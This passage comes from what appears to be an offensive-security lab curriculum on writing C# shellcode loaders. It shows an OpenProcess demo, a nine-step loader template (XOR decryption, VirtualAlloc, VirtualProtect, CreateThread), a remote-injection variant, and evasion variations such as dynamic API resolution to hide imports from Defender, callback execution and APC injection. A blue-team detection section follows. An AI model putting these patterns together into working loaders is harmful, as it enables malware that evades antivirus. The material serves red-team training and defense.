    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    static void Main(string[] args)
    {
        string targetName = args.Length > 0 ? args[0] : "explorer";

        Process[] found = Process.GetProcessesByName(targetName);
        if (found.Length == 0)
        {
            Console.WriteLine("[-] " + targetName + " is not running.");
            return;
        }

        int pid = found[0].Id;
        Console.WriteLine("[+] Found " + targetName + ".exe with PID: " + pid);

        IntPtr handle = OpenProcess(0x0400, false, pid);
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed.");
            return;
        }

        Console.WriteLine("[+] Got handle: 0x" + handle.ToString("X"));
        Console.WriteLine("[*] We can read info about this process.");
        Console.WriteLine("[*] To inject code, we would need PROCESS_ALL_ACCESS (0x1FFFFF).");

        CloseHandle(handle);
        Console.WriteLine("[+] Handle closed.");
    }
}
```

Run it with `dotnet run` (defaults to explorer) or `dotnet run -- notepad` (targets notepad if it is running).

### Part 10: The Complete Loader Pattern

Every loader in this curriculum follows the same structure. Now that you understand each function individually, here is how they fit together in a real loader. This is not a working loader yet (that is Document 05), but it is the exact template that every loader builds on:

```
Step 1: Read encrypted shellcode from a file (File.ReadAllBytes)
Step 2: Convert the command-line key from hex to bytes (HexToBytes)
Step 3: Decrypt the shellcode using XOR (TransformData)
Step 4: Allocate read-write memory (VirtualAlloc with 0x04)
Step 5: Copy decrypted shellcode into that memory (Marshal.Copy)
Step 6: Clear the decrypted shellcode from the C# array (Array.Clear)
Step 7: Change memory permissions to executable (VirtualProtect with 0x20)
Step 8: Create a thread at the shellcode's address (CreateThread)
Step 9: Wait for the thread to finish (WaitForSingleObject)
```

For remote injection (Documents 09, 10), steps 4-8 change slightly:

```
Step 4: Open the target process (OpenProcess)
Step 5: Allocate memory inside the target process (VirtualAllocEx)
Step 6: Copy shellcode into the target process (WriteProcessMemory)
Step 7: Change remote memory permissions (VirtualProtectEx)
Step 8: Create a thread in the target process (CreateRemoteThread)
```

The core idea is the same: get shellcode bytes into executable memory and tell the CPU to run them. Whether that memory is in your own process or another process determines which functions you use.

## Compilation and Execution

For every example in this document:

1. Open the Lesson folder: `cd C:\Users\kimjongun\Desktop\CSharpLab\Lesson`
2. Replace Program.cs with the example code
3. Run: `dotnet run`
4. For programs with arguments: `dotnet run -- arg1`

The MessageBox example requires the Windows desktop (you cannot run it from a headless SSH session). The OpenProcess example works from any terminal.

## Confirming Success

After completing this document, verify:

- [ ] You understand that the Windows API is how programs ask Windows to do things (allocate memory, create windows, open processes)
- [ ] You can explain what a DLL is (a file containing Windows functions)
- [ ] You can write a DllImport declaration for a Windows function
- [ ] You can call MessageBox from C# and see the dialog appear
- [ ] You can call GetCurrentProcessId and verify the PID in Task Manager
- [ ] You understand what a handle is (a reference number Windows gives you to track a resource)
- [ ] You can call VirtualAlloc to allocate memory with specific permissions
- [ ] You can use Marshal.Copy to put data into allocated memory
- [ ] You can use VirtualProtect to change memory permissions to executable
- [ ] You can use CreateThread to start executing code at a memory address
- [ ] You can use WaitForSingleObject to keep the program alive while a thread runs
- [ ] You can use GetModuleHandle and GetProcAddress to find a function at runtime without DllImport
- [ ] You understand why dynamic API resolution helps avoid detection (the import table does not contain the function names)
- [ ] You can find a running process by name and open it with OpenProcess

## What Was Gained

You now understand how C# programs communicate with Windows. Specifically:

**The Windows API** is a set of functions that Windows provides for programs to use. Every time a program needs Windows to do something (show a dialog, allocate memory, open a file, create a process), it calls a Windows API function. The functions live in DLL files in C:\Windows\System32\.

**P/Invoke (DllImport)** is how C# calls these Windows functions. You declare the function with [DllImport("dllname.dll")], specify its parameters, and call it like a normal C# function.

**VirtualAlloc + Marshal.Copy + VirtualProtect + CreateThread** is the fundamental shellcode execution pattern. Allocate memory, copy code into it, make it executable, start a thread. Every loader in this curriculum uses this pattern or a variation of it.

**Dynamic API resolution (GetModuleHandle + GetProcAddress)** finds functions at runtime instead of declaring them with DllImport. This keeps function names out of the compiled binary's import table, making static analysis harder for Defender.

**OpenProcess** gives you access to another running program's memory space. This is the first step in remote injection, where shellcode runs inside a trusted process instead of the loader itself.

## Common Threats and Variations

### Variation 1: Using Delegates for All Windows Functions

Instead of DllImport for any function, you can use GetProcAddress for everything. This makes the import table almost empty, containing only GetModuleHandle and GetProcAddress themselves. Loaders 05 through 08 use this technique for the sensitive functions (VirtualAlloc, CreateThread) while keeping GetModuleHandle and GetProcAddress as DllImport because those two functions are used by thousands of legitimate programs and are not suspicious on their own.

### Variation 2: Callback Functions Instead of CreateThread

CreateThread is a well-known indicator of shellcode execution. Some loaders avoid it entirely by using Windows functions that accept a callback (a function pointer that Windows calls for you). For example, `EnumChildWindows` expects a callback function and calls it for every window. If you pass your shellcode's address as the callback, Windows executes it without you ever calling CreateThread. Defender has a harder time detecting this because EnumChildWindows is a completely normal function used by legitimate programs.

### Variation 3: APC Injection Instead of CreateRemoteThread

For remote injection, CreateRemoteThread is heavily monitored. An alternative is APC (Asynchronous Procedure Call) injection, where you queue your shellcode as an APC to an existing thread in the target process. The next time that thread enters an alertable wait state, it executes your code. This avoids creating a new thread entirely.

## Detection and Defense (Blue Team Perspective)

**Import table scanning.** Static analysis of a binary's import table reveals which Windows functions it uses. The combination of VirtualAlloc + CreateThread in a .NET binary is suspicious, especially in a binary that was recently downloaded or created.

Blue team action: deploy YARA rules that flag .NET binaries importing suspicious API combinations. Florian Roth's signature-base has rules for known offensive tool patterns.

**API hooking and monitoring.** EDR tools hook functions like VirtualAlloc and CreateThread inside kernel32.dll. Every call to these functions gets logged with parameters (how much memory was requested, what permissions, what start address for the thread).

Blue team action: configure EDR to alert when a .NET process calls VirtualAlloc with executable permissions followed by CreateThread with a start address in the new allocation.

**Memory permission change tracking.** Memory that changes from read-write to execute (via VirtualProtect) is unusual for legitimate programs. Most programs allocate memory with fixed permissions.

Blue team action: enable memory permission change logging. Alert on processes that use VirtualProtect to add execute permission to a memory region, especially if that region was recently written to.

**Dynamic resolution detection.** Programs that call GetProcAddress to resolve VirtualAlloc, CreateThread, or other injection-related functions are using a known malware technique.

Blue team action: monitor GetProcAddress calls that resolve sensitive function names. Flag processes that dynamically resolve multiple injection-related APIs in sequence.

## What Comes Next

Start Document 04 (lab/materials/04_memory_fundamentals.md). It goes deeper into how Windows manages memory: what virtual memory is, how address spaces work, what pages and permissions are, and the difference between allocating memory in your own process versus another process. This gives you the deeper understanding of what VirtualAlloc and WriteProcessMemory are actually doing at the OS level.
